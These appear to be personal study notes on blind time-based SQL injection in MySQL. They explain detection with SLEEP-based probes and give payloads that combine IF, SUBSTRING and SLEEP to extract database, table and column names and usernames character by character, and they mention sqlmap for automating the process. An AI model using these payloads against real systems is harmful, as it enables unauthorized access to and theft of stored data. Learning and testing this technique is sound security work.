# 02.sql-injection-blind-time-based

27/05/25

## Recall

- What is a Blind Time-Based SQL Injection?
- Why is this technique used instead of standard SQL Injection?
- How does the attacker extract data using time-based payloads?
- What conditions must be present on the server for this to work?
- How can developers prevent Blind Time-Based SQL Injection?

## Notes

### What it is

**Blind Time-Based SQL Injection** is an attack technique used when a web application is vulnerable to SQL Injection but does not return any direct feedback in the HTTP response (i.e., there is no error-based or data-based response). In this scenario, attackers exploit the **time it takes for the database to respond** to infer information.

The technique relies on injecting SQL queries that deliberately cause a delay in the server response using functions like `SLEEP()` (MySQL), `pg_sleep()` (PostgreSQL), or `WAITFOR DELAY` (SQL Server). Combined with logical operators like `IF()`, `CASE WHEN`, and string manipulation functions like `SUBSTRING()`, attackers can extract database information **character by character**, observing whether the server delays its response based on the truth of certain conditions.

This form of SQL Injection is extremely stealthy but slow because it requires many requests to retrieve full pieces of information.

### How to identify it

Detection starts similarly to other SQL Injection attacks:

1. **Injection Testing**:
    
    Test input fields with common payloads:
    
    ```sql
    ' OR 1=1; -- 
    ' UNION SELECT NULL; -- 
    ```
    
    If there's no visible error or output, but some logical bypass occurs (like logging in without valid credentials), SQL Injection might be present.
    
2. **Column Count Discovery**:
    
    Even though it's blind, knowing the number of columns can sometimes still be helpful (especially for confirming injection points in some DBMS):
    
    ```sql
    ' ORDER BY 1 -- -
    ' ORDER BY 2 -- -
    ...
    ```
    
3. **Time-Based Validation**:
Inject a payload to see if the response is delayed:
    
    ```sql
    ' OR SLEEP(5) -- -
    ' UNION SELECT SLEEP(5) -- -
    ```
    
    If the server response consistently delays by the number of seconds specified, it strongly indicates a time-based injection point.
    

### How to exploit it

The exploitation process involves carefully crafting SQL queries that check whether certain conditions are true. If true, the query triggers a delay; if false, it returns immediately. The attacker monitors the response time to deduce whether the condition holds.

The main functions used:

- **`SUBSTRING(string, position, length)`**
    
    Extracts a part of the string starting from `position` with `length` characters.
    
- **`IF(condition, true_action, false_action)`**
    
    Evaluates the condition. If it's true, executes `true_action` (e.g., `SLEEP(5)`), else executes `false_action` (usually `NULL`).
    
- **`SLEEP(seconds)`**
    
    Delays the response for the specified number of seconds (MySQL example).
    

Payload example for extracting the database name:

Check whether the first character of the database name is `t`:

```sql
IF(SUBSTRING(DATABASE(), 1, 1) = 't', SLEEP(5), NULL);
```

If the server delays, the letter is correct. Repeat the process for the next letters:

```sql
IF(SUBSTRING(DATABASE(), 1, 2) = 'ta', SLEEP(5), NULL);
IF(SUBSTRING(DATABASE(), 1, 3) = 'tar', SLEEP(5), NULL);
...
```

Until the full name is recovered.

---

Payload example for extracting the database tables:

Get the first table in the database `target_db`:

```sql
IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1), 1, 1) = 'u', SLEEP(5), NULL);
```

If the server delays, the letter is correct. Repeat the process for the next letters to extract the table’s name

Advance to the next table with:

```sql
IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='target_db' LIMIT 1,1), 1, 1) = 'p', SLEEP(5), NULL);
```

---

Payload example for extracting table columns

For table `users`:

```sql
IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1) = 'i', SLEEP(5), NULL);
```

If the server delays, the letter is correct. Repeat the process for the next letters to extract the column’s name

Move to the next column with:

```sql
IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1), 1, 2) = 'na', SLEEP(5), NULL);
```

---

Payload example for extracting data from a table

If there is a `username` column in the `users` table:

```sql
IF(SUBSTRING((SELECT username FROM users LIMIT 0,1), 1, 1) = 'a', SLEEP(5), NULL);
```

Then iterate character by character for each user or data row.

---

While manual exploitation is possible for learning purposes, real-world attackers automate this process using tools like:

- **`sqlmap`** (supports blind time-based extraction)
- Custom Python scripts with requests, time measurement, and loops over character sets (`a-zA-Z0-9_`).

## Summary

**Blind Time-Based SQL Injection** is a stealthy yet powerful method for exploiting SQL injection vulnerabilities when no output is reflected in the application's response. The attacker leverages database-side delay functions (like `SLEEP()`) combined with conditional logic to extract information character by character based on the server’s response time.

This technique is highly effective against hardened applications with error handling and no verbose output but is considerably slower than error-based or union-based injections.